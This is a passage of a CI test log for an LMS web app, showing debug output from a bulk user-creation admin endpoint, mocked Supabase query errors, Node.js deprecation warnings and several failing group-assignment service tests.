2025-11-18T17:35:26.4002957Z [BULK-IMPORT] Top-level error category: database_connection
2025-11-18T17:35:26.4003364Z 
2025-11-18T17:35:26.4004805Z [90mstderr[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mError Handling[2m > [22m[2mshould handle parsing errors[22m[39m
2025-11-18T17:35:26.4006046Z [BULK-IMPORT] Top-level handler error: {
2025-11-18T17:35:26.4006678Z   timestamp: [32m'2025-11-18T17:35:26.371Z'[39m,
2025-11-18T17:35:26.4007505Z   errorType: [32m'TypeError'[39m,
2025-11-18T17:35:26.4008541Z   errorMessage: [32m'supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.4009413Z   errorCode: [90mundefined[39m,
2025-11-18T17:35:26.4009895Z   requestSize: [33m11[39m,
2025-11-18T17:35:26.4010335Z   userCount: [33m0[39m,
2025-11-18T17:35:26.4010693Z   stackTrace: [
2025-11-18T17:35:26.4011589Z     [32m'TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.4012954Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/admin/bulk-create-users.ts:171:8)'[39m,
2025-11-18T17:35:26.4014322Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/admin/bulk-create-users.test.ts:668:7'[39m,
2025-11-18T17:35:26.4015745Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)'[39m,
2025-11-18T17:35:26.4017633Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)'[39m
2025-11-18T17:35:26.4018473Z   ],
2025-11-18T17:35:26.4018861Z   nodeEnv: [32m'test'[39m,
2025-11-18T17:35:26.4019409Z   supabaseConfigured: [33mtrue[39m
2025-11-18T17:35:26.4019823Z }
2025-11-18T17:35:26.4020340Z [BULK-IMPORT] Top-level error category: database_connection
2025-11-18T17:35:26.4020752Z 
2025-11-18T17:35:26.4022324Z [90mstderr[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mError Handling[2m > [22m[2mshould handle no valid users scenario[22m[39m
2025-11-18T17:35:26.4023943Z [BULK-IMPORT] Top-level handler error: {
2025-11-18T17:35:26.4024637Z   timestamp: [32m'2025-11-18T17:35:26.373Z'[39m,
2025-11-18T17:35:26.4025280Z   errorType: [32m'TypeError'[39m,
2025-11-18T17:35:26.4026356Z   errorMessage: [32m'supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.4027638Z   errorCode: [90mundefined[39m,
2025-11-18T17:35:26.4028154Z   requestSize: [33m8[39m,
2025-11-18T17:35:26.4028596Z   userCount: [33m0[39m,
2025-11-18T17:35:26.4028949Z   stackTrace: [
2025-11-18T17:35:26.4029870Z     [32m'TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.4031342Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/admin/bulk-create-users.ts:171:8)'[39m,
2025-11-18T17:35:26.4032820Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/admin/bulk-create-users.test.ts:697:7'[39m,
2025-11-18T17:35:26.4034301Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)'[39m,
2025-11-18T17:35:26.4035821Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)'[39m
2025-11-18T17:35:26.4036648Z   ],
2025-11-18T17:35:26.4037332Z   nodeEnv: [32m'test'[39m,
2025-11-18T17:35:26.4038080Z   supabaseConfigured: [33mtrue[39m
2025-11-18T17:35:26.4038515Z }
2025-11-18T17:35:26.4039051Z [BULK-IMPORT] Top-level error category: database_connection
2025-11-18T17:35:26.4039500Z 
2025-11-18T17:35:26.4041198Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mRequest Validation[2m > [22m[2mshould reject non-POST requests[22m[39m
2025-11-18T17:35:26.4043163Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.353Z
2025-11-18T17:35:26.4044139Z ❌ [BULK-IMPORT] Method not allowed: GET
2025-11-18T17:35:26.4044508Z 
2025-11-18T17:35:26.4046171Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mRequest Validation[2m > [22m[2mshould reject requests without CSV data[22m[39m
2025-11-18T17:35:26.4048235Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.354Z
2025-11-18T17:35:26.4048754Z 
2025-11-18T17:35:26.4050409Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mRequest Validation[2m > [22m[2mshould reject invalid CSV data type[22m[39m
2025-11-18T17:35:26.4052258Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.355Z
2025-11-18T17:35:26.4052786Z 
2025-11-18T17:35:26.4054425Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mUser Creation[2m > [22m[2mshould successfully create single user[22m[39m
2025-11-18T17:35:26.4056261Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.357Z
2025-11-18T17:35:26.4057393Z [BULK-IMPORT] AUTH DEBUG: Token extraction: {
2025-11-18T17:35:26.4058035Z   authHeaderLength: [33m18[39m,
2025-11-18T17:35:26.4058527Z   tokenLength: [33m11[39m,
2025-11-18T17:35:26.4059062Z   tokenPrefix: [32m'valid-token...'[39m,
2025-11-18T17:35:26.4059718Z   timestamp: [32m'2025-11-18T17:35:26.357Z'[39m
2025-11-18T17:35:26.4060185Z }
2025-11-18T17:35:26.4060627Z [BULK-IMPORT] AUTH DEBUG: User resolution: {
2025-11-18T17:35:26.4061185Z   authError: [1mnull[22m,
2025-11-18T17:35:26.4061648Z   userFound: [33mtrue[39m,
2025-11-18T17:35:26.4062158Z   userId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4062683Z   userEmail: [90mundefined[39m,
2025-11-18T17:35:26.4063242Z   userCreatedAt: [90mundefined[39m,
2025-11-18T17:35:26.4063784Z   userAud: [90mundefined[39m,
2025-11-18T17:35:26.4064300Z   userRole: [90mundefined[39m
2025-11-18T17:35:26.4064678Z }
2025-11-18T17:35:26.4065393Z [BULK-IMPORT] ROLE QUERY DEBUG: Query parameters: {
2025-11-18T17:35:26.4066058Z   queryUserId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4066638Z   userIdType: [32m'string'[39m,
2025-11-18T17:35:26.4067341Z   userIdLength: [33m9[39m,
2025-11-18T17:35:26.4068100Z   expectedUserId: [32m'4ae17b21-8977-425c-b05a-ca7cdb8b9df5'[39m,
2025-11-18T17:35:26.4068854Z   userIdMatch: [33mfalse[39m,
2025-11-18T17:35:26.4069461Z   supabaseClientConfigured: [33mtrue[39m,
2025-11-18T17:35:26.4070516Z   queryFilters: { user_id: [32m'admin-123'[39m, role_type: [32m'admin'[39m, is_active: [33mtrue[39m }
2025-11-18T17:35:26.4071272Z }
2025-11-18T17:35:26.4071430Z 
2025-11-18T17:35:26.4073088Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mUser Creation[2m > [22m[2mshould handle multiple users in batches[22m[39m
2025-11-18T17:35:26.4074884Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.360Z
2025-11-18T17:35:26.4075696Z [BULK-IMPORT] AUTH DEBUG: Token extraction: {
2025-11-18T17:35:26.4076313Z   authHeaderLength: [33m18[39m,
2025-11-18T17:35:26.4076989Z   tokenLength: [33m11[39m,
2025-11-18T17:35:26.4077539Z   tokenPrefix: [32m'valid-token...'[39m,
2025-11-18T17:35:26.4078164Z   timestamp: [32m'2025-11-18T17:35:26.360Z'[39m
2025-11-18T17:35:26.4078614Z }
2025-11-18T17:35:26.4079250Z [BULK-IMPORT] AUTH DEBUG: User resolution: {
2025-11-18T17:35:26.4079857Z   authError: [1mnull[22m,
2025-11-18T17:35:26.4080330Z   userFound: [33mtrue[39m,
2025-11-18T17:35:26.4080858Z   userId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4081397Z   userEmail: [90mundefined[39m,
2025-11-18T17:35:26.4081981Z   userCreatedAt: [90mundefined[39m,
2025-11-18T17:35:26.4082534Z   userAud: [90mundefined[39m,
2025-11-18T17:35:26.4083071Z   userRole: [90mundefined[39m
2025-11-18T17:35:26.4083452Z }
2025-11-18T17:35:26.4083939Z [BULK-IMPORT] ROLE QUERY DEBUG: Query parameters: {
2025-11-18T17:35:26.4084658Z   queryUserId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4085252Z   userIdType: [32m'string'[39m,
2025-11-18T17:35:26.4085772Z   userIdLength: [33m9[39m,
2025-11-18T17:35:26.4086533Z   expectedUserId: [32m'4ae17b21-8977-425c-b05a-ca7cdb8b9df5'[39m,
2025-11-18T17:35:26.4087651Z   userIdMatch: [33mfalse[39m,
2025-11-18T17:35:26.4088288Z   supabaseClientConfigured: [33mtrue[39m,
2025-11-18T17:35:26.4089394Z   queryFilters: { user_id: [32m'admin-123'[39m, role_type: [32m'admin'[39m, is_active: [33mtrue[39m }
2025-11-18T17:35:26.4090137Z }
2025-11-18T17:35:26.4090291Z 
2025-11-18T17:35:26.4091940Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mUser Creation[2m > [22m[2mshould handle existing users gracefully[22m[39m
2025-11-18T17:35:26.4093804Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.362Z
2025-11-18T17:35:26.4094597Z [BULK-IMPORT] AUTH DEBUG: Token extraction: {
2025-11-18T17:35:26.4095230Z   authHeaderLength: [33m18[39m,
2025-11-18T17:35:26.4095712Z   tokenLength: [33m11[39m,
2025-11-18T17:35:26.4096250Z   tokenPrefix: [32m'valid-token...'[39m,
2025-11-18T17:35:26.4097111Z   timestamp: [32m'2025-11-18T17:35:26.362Z'[39m
2025-11-18T17:35:26.4097580Z }
2025-11-18T17:35:26.4098035Z [BULK-IMPORT] AUTH DEBUG: User resolution: {
2025-11-18T17:35:26.4098615Z   authError: [1mnull[22m,
2025-11-18T17:35:26.4099085Z   userFound: [33mtrue[39m,
2025-11-18T17:35:26.4099583Z   userId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4100109Z   userEmail: [90mundefined[39m,
2025-11-18T17:35:26.4100649Z   userCreatedAt: [90mundefined[39m,
2025-11-18T17:35:26.4101191Z   userAud: [90mundefined[39m,
2025-11-18T17:35:26.4101711Z   userRole: [90mundefined[39m
2025-11-18T17:35:26.4102094Z }
2025-11-18T17:35:26.4102563Z [BULK-IMPORT] ROLE QUERY DEBUG: Query parameters: {
2025-11-18T17:35:26.4103214Z   queryUserId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4103783Z   userIdType: [32m'string'[39m,
2025-11-18T17:35:26.4104573Z   userIdLength: [33m9[39m,
2025-11-18T17:35:26.4105373Z   expectedUserId: [32m'4ae17b21-8977-425c-b05a-ca7cdb8b9df5'[39m,
2025-11-18T17:35:26.4106094Z   userIdMatch: [33mfalse[39m,
2025-11-18T17:35:26.4106663Z   supabaseClientConfigured: [33mtrue[39m,
2025-11-18T17:35:26.4108048Z   queryFilters: { user_id: [32m'admin-123'[39m, role_type: [32m'admin'[39m, is_active: [33mtrue[39m }
2025-11-18T17:35:26.4108819Z }
2025-11-18T17:35:26.4108985Z 
2025-11-18T17:35:26.4110564Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mUser Creation[2m > [22m[2mshould validate passwords[22m[39m
2025-11-18T17:35:26.4112307Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.364Z
2025-11-18T17:35:26.4113108Z [BULK-IMPORT] AUTH DEBUG: Token extraction: {
2025-11-18T17:35:26.4113775Z   authHeaderLength: [33m18[39m,
2025-11-18T17:35:26.4114299Z   tokenLength: [33m11[39m,
2025-11-18T17:35:26.4114888Z   tokenPrefix: [32m'valid-token...'[39m,
2025-11-18T17:35:26.4115545Z   timestamp: [32m'2025-11-18T17:35:26.364Z'[39m
2025-11-18T17:35:26.4116011Z }
2025-11-18T17:35:26.4116464Z [BULK-IMPORT] AUTH DEBUG: User resolution: {
2025-11-18T17:35:26.4117260Z   authError: [1mnull[22m,
2025-11-18T17:35:26.4117747Z   userFound: [33mtrue[39m,
2025-11-18T17:35:26.4118277Z   userId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4119079Z   userEmail: [90mundefined[39m,
2025-11-18T17:35:26.4119664Z   userCreatedAt: [90mundefined[39m,
2025-11-18T17:35:26.4120223Z   userAud: [90mundefined[39m,
2025-11-18T17:35:26.4120753Z   userRole: [90mundefined[39m
2025-11-18T17:35:26.4121150Z }
2025-11-18T17:35:26.4121651Z [BULK-IMPORT] ROLE QUERY DEBUG: Query parameters: {
2025-11-18T17:35:26.4122347Z   queryUserId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4122894Z   userIdType: [32m'string'[39m,
2025-11-18T17:35:26.4123372Z   userIdLength: [33m9[39m,
2025-11-18T17:35:26.4124108Z   expectedUserId: [32m'4ae17b21-8977-425c-b05a-ca7cdb8b9df5'[39m,
2025-11-18T17:35:26.4124877Z   userIdMatch: [33mfalse[39m,
2025-11-18T17:35:26.4125489Z   supabaseClientConfigured: [33mtrue[39m,
2025-11-18T17:35:26.4126593Z   queryFilters: { user_id: [32m'admin-123'[39m, role_type: [32m'admin'[39m, is_active: [33mtrue[39m }
2025-11-18T17:35:26.4127599Z }
2025-11-18T17:35:26.4127764Z 
2025-11-18T17:35:26.4129457Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mUser Creation[2m > [22m[2mshould include invalid users in results[22m[39m
2025-11-18T17:35:26.4131264Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.367Z
2025-11-18T17:35:26.4132074Z [BULK-IMPORT] AUTH DEBUG: Token extraction: {
2025-11-18T17:35:26.4132697Z   authHeaderLength: [33m18[39m,
2025-11-18T17:35:26.4133204Z   tokenLength: [33m11[39m,
2025-11-18T17:35:26.4133796Z   tokenPrefix: [32m'valid-token...'[39m,
2025-11-18T17:35:26.4134479Z   timestamp: [32m'2025-11-18T17:35:26.367Z'[39m
2025-11-18T17:35:26.4134953Z }
2025-11-18T17:35:26.4135389Z [BULK-IMPORT] AUTH DEBUG: User resolution: {
2025-11-18T17:35:26.4135977Z   authError: [1mnull[22m,
2025-11-18T17:35:26.4136476Z   userFound: [33mtrue[39m,
2025-11-18T17:35:26.4137943Z   userId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4138528Z   userEmail: [90mundefined[39m,
2025-11-18T17:35:26.4139093Z   userCreatedAt: [90mundefined[39m,
2025-11-18T17:35:26.4139633Z   userAud: [90mundefined[39m,
2025-11-18T17:35:26.4140125Z   userRole: [90mundefined[39m
2025-11-18T17:35:26.4140491Z }
2025-11-18T17:35:26.4140955Z [BULK-IMPORT] ROLE QUERY DEBUG: Query parameters: {
2025-11-18T17:35:26.4141580Z   queryUserId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4142118Z   userIdType: [32m'string'[39m,
2025-11-18T17:35:26.4142607Z   userIdLength: [33m9[39m,
2025-11-18T17:35:26.4143419Z   expectedUserId: [32m'4ae17b21-8977-425c-b05a-ca7cdb8b9df5'[39m,
2025-11-18T17:35:26.4144117Z   userIdMatch: [33mfalse[39m,
2025-11-18T17:35:26.4144970Z   supabaseClientConfigured: [33mtrue[39m,
2025-11-18T17:35:26.4146062Z   queryFilters: { user_id: [32m'admin-123'[39m, role_type: [32m'admin'[39m, is_active: [33mtrue[39m }
2025-11-18T17:35:26.4146972Z }
2025-11-18T17:35:26.4147156Z 
2025-11-18T17:35:26.4148797Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mUser Creation[2m > [22m[2mshould handle profile creation errors[22m[39m
2025-11-18T17:35:26.4150620Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.369Z
2025-11-18T17:35:26.4151425Z [BULK-IMPORT] AUTH DEBUG: Token extraction: {
2025-11-18T17:35:26.4152030Z   authHeaderLength: [33m18[39m,
2025-11-18T17:35:26.4152507Z   tokenLength: [33m11[39m,
2025-11-18T17:35:26.4153075Z   tokenPrefix: [32m'valid-token...'[39m,
2025-11-18T17:35:26.4153729Z   timestamp: [32m'2025-11-18T17:35:26.369Z'[39m
2025-11-18T17:35:26.4154189Z }
2025-11-18T17:35:26.4154647Z [BULK-IMPORT] AUTH DEBUG: User resolution: {
2025-11-18T17:35:26.4155206Z   authError: [1mnull[22m,
2025-11-18T17:35:26.4155671Z   userFound: [33mtrue[39m,
2025-11-18T17:35:26.4156218Z   userId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4156945Z   userEmail: [90mundefined[39m,
2025-11-18T17:35:26.4157547Z   userCreatedAt: [90mundefined[39m,
2025-11-18T17:35:26.4158134Z   userAud: [90mundefined[39m,
2025-11-18T17:35:26.4158915Z   userRole: [90mundefined[39m
2025-11-18T17:35:26.4159337Z }
2025-11-18T17:35:26.4159846Z [BULK-IMPORT] ROLE QUERY DEBUG: Query parameters: {
2025-11-18T17:35:26.4160545Z   queryUserId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4161154Z   userIdType: [32m'string'[39m,
2025-11-18T17:35:26.4161690Z   userIdLength: [33m9[39m,
2025-11-18T17:35:26.4162446Z   expectedUserId: [32m'4ae17b21-8977-425c-b05a-ca7cdb8b9df5'[39m,
2025-11-18T17:35:26.4163196Z   userIdMatch: [33mfalse[39m,
2025-11-18T17:35:26.4163775Z   supabaseClientConfigured: [33mtrue[39m,
2025-11-18T17:35:26.4164801Z   queryFilters: { user_id: [32m'admin-123'[39m, role_type: [32m'admin'[39m, is_active: [33mtrue[39m }
2025-11-18T17:35:26.4165493Z }
2025-11-18T17:35:26.4165655Z 
2025-11-18T17:35:26.4167474Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mError Handling[2m > [22m[2mshould handle parsing errors[22m[39m
2025-11-18T17:35:26.4169251Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.371Z
2025-11-18T17:35:26.4170062Z [BULK-IMPORT] AUTH DEBUG: Token extraction: {
2025-11-18T17:35:26.4170726Z   authHeaderLength: [33m18[39m,
2025-11-18T17:35:26.4171224Z   tokenLength: [33m11[39m,
2025-11-18T17:35:26.4171768Z   tokenPrefix: [32m'valid-token...'[39m,
2025-11-18T17:35:26.4172382Z   timestamp: [32m'2025-11-18T17:35:26.371Z'[39m
2025-11-18T17:35:26.4172800Z }
2025-11-18T17:35:26.4173205Z [BULK-IMPORT] AUTH DEBUG: User resolution: {
2025-11-18T17:35:26.4173724Z   authError: [1mnull[22m,
2025-11-18T17:35:26.4174178Z   userFound: [33mtrue[39m,
2025-11-18T17:35:26.4174656Z   userId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4175139Z   userEmail: [90mundefined[39m,
2025-11-18T17:35:26.4175660Z   userCreatedAt: [90mundefined[39m,
2025-11-18T17:35:26.4176151Z   userAud: [90mundefined[39m,
2025-11-18T17:35:26.4176605Z   userRole: [90mundefined[39m
2025-11-18T17:35:26.4177140Z }
2025-11-18T17:35:26.4177604Z [BULK-IMPORT] ROLE QUERY DEBUG: Query parameters: {
2025-11-18T17:35:26.4178227Z   queryUserId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4178759Z   userIdType: [32m'string'[39m,
2025-11-18T17:35:26.4179223Z   userIdLength: [33m9[39m,
2025-11-18T17:35:26.4179920Z   expectedUserId: [32m'4ae17b21-8977-425c-b05a-ca7cdb8b9df5'[39m,
2025-11-18T17:35:26.4180581Z   userIdMatch: [33mfalse[39m,
2025-11-18T17:35:26.4181138Z   supabaseClientConfigured: [33mtrue[39m,
2025-11-18T17:35:26.4182111Z   queryFilters: { user_id: [32m'admin-123'[39m, role_type: [32m'admin'[39m, is_active: [33mtrue[39m }
2025-11-18T17:35:26.4182992Z }
2025-11-18T17:35:26.4183148Z 
2025-11-18T17:35:26.4184692Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mError Handling[2m > [22m[2mshould handle no valid users scenario[22m[39m
2025-11-18T17:35:26.4186505Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.372Z
2025-11-18T17:35:26.4187905Z [BULK-IMPORT] AUTH DEBUG: Token extraction: {
2025-11-18T17:35:26.4188586Z   authHeaderLength: [33m18[39m,
2025-11-18T17:35:26.4189101Z   tokenLength: [33m11[39m,
2025-11-18T17:35:26.4189661Z   tokenPrefix: [32m'valid-token...'[39m,
2025-11-18T17:35:26.4190317Z   timestamp: [32m'2025-11-18T17:35:26.372Z'[39m
2025-11-18T17:35:26.4190783Z }
2025-11-18T17:35:26.4191221Z [BULK-IMPORT] AUTH DEBUG: User resolution: {
2025-11-18T17:35:26.4191799Z   authError: [1mnull[22m,
2025-11-18T17:35:26.4192272Z   userFound: [33mtrue[39m,
2025-11-18T17:35:26.4192910Z   userId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4193462Z   userEmail: [90mundefined[39m,
2025-11-18T17:35:26.4194011Z   userCreatedAt: [90mundefined[39m,
2025-11-18T17:35:26.4194545Z   userAud: [90mundefined[39m,
2025-11-18T17:35:26.4195033Z   userRole: [90mundefined[39m
2025-11-18T17:35:26.4195405Z }
2025-11-18T17:35:26.4195884Z [BULK-IMPORT] ROLE QUERY DEBUG: Query parameters: {
2025-11-18T17:35:26.4196968Z   queryUserId: [32m'admin-123'[39m,
2025-11-18T17:35:26.4197602Z   userIdType: [32m'string'[39m,
2025-11-18T17:35:26.4198082Z   userIdLength: [33m9[39m,
2025-11-18T17:35:26.4198799Z   expectedUserId: [32m'4ae17b21-8977-425c-b05a-ca7cdb8b9df5'[39m,
2025-11-18T17:35:26.4199493Z   userIdMatch: [33mfalse[39m,
2025-11-18T17:35:26.4200536Z   supabaseClientConfigured: [33mtrue[39m,
2025-11-18T17:35:26.4201704Z   queryFilters: { user_id: [32m'admin-123'[39m, role_type: [32m'admin'[39m, is_active: [33mtrue[39m }
2025-11-18T17:35:26.4202418Z }
2025-11-18T17:35:26.4202583Z 
2025-11-18T17:35:27.2108644Z  [33m❯[39m e2e/tests/reports-analytics.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:27.2113501Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:27.2115864Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:27.2117569Z 
2025-11-18T17:35:28.0201866Z  [33m❯[39m e2e/tests/admin-learning-paths.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:28.0207537Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:28.0209979Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:28.0211376Z 
2025-11-18T17:35:28.5631689Z  [33m❯[39m components/__tests__/GroupAssignmentsContent.test.tsx [2m ([22m[2m10 tests[22m[2m)[22m[90m 9[2mms[22m[39m
2025-11-18T17:35:28.5638167Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:28.5639748Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:28.5640658Z 
2025-11-18T17:35:29.0568356Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:29.0570836Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:29.0572160Z 
2025-11-18T17:35:29.2218584Z [90mstderr[2m | __tests__/lib/services/groupAssignmentsV2.test.js[2m > [22m[2mgroupAssignmentsV2Service[2m > [22m[2mgetOrCreateGroup[2m > [22m[2mreturns existing group if found[22m[39m
2025-11-18T17:35:29.2220667Z [GroupAssignments] Unexpected error checking group membership: {
2025-11-18T17:35:29.2221477Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:29.2222127Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:29.2222953Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:29.2223971Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:29.2225755Z     [32m'    at GroupAssignmentsV2Service.getOrCreateGroup (/home/runner/work/fne-lms/fne-lms/lib/services/groupAssignmentsV2.js:310:65)\n'[39m +
2025-11-18T17:35:29.2227761Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/lib/services/groupAssignmentsV2.test.js:447:25\n'[39m +
2025-11-18T17:35:29.2228964Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:29.2229973Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:29.2230838Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:29.2231674Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:29.2232735Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:29.2233597Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:29.2234091Z   hint: [32m''[39m,
2025-11-18T17:35:29.2234304Z   code: [32m''[39m
2025-11-18T17:35:29.2234493Z }
2025-11-18T17:35:29.2234582Z 
2025-11-18T17:35:29.2262992Z  [33m❯[39m __tests__/lib/services/groupAssignmentsV2.test.js [2m ([22m[2m6 tests[22m [2m|[22m [31m4 failed[39m[2m)[22m[90m 206[2mms[22m[39m
2025-11-18T17:35:29.2269012Z [90mstderr[2m | __tests__/lib/services/groupAssignmentsV2.test.js[2m > [22m[2mgroupAssignmentsV2Service[2m > [22m[2mgetOrCreateGroup[2m > [22m[2mcreates new group when none exists[22m[39m
2025-11-18T17:35:29.2273699Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2.test.js[2m > [22mgroupAssignmentsV2Service[2m > [22mgetGroupAssignmentsForUser[2m > [22mextracts group assignments with resources from lessons[39m
2025-11-18T17:35:29.2275350Z [GroupAssignments] Unexpected error checking group membership: {
2025-11-18T17:35:29.2276099Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:29.2276656Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:29.2277553Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:29.2278454Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:29.2279910Z     [32m'    at GroupAssignmentsV2Service.getOrCreateGroup (/home/runner/work/fne-lms/fne-lms/lib/services/groupAssignmentsV2.js:310:65)\n'[39m +
2025-11-18T17:35:29.2281467Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/lib/services/groupAssignmentsV2.test.js:499:25\n'[39m +
2025-11-18T17:35:29.2282832Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:29.2284253Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:29.2285667Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:29.2287275Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
